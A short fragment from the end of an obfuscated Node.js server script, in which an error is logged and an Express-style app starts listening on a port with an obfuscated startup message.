_0x86a3e9=_0x18717b;console['error'](_0x86a3e9(0x289),_0x53fdff);}),app['listen'](PORT,()=>console[_0x18717b(0x299)](_0x18717b(0x1f4)+PORT+'!'));
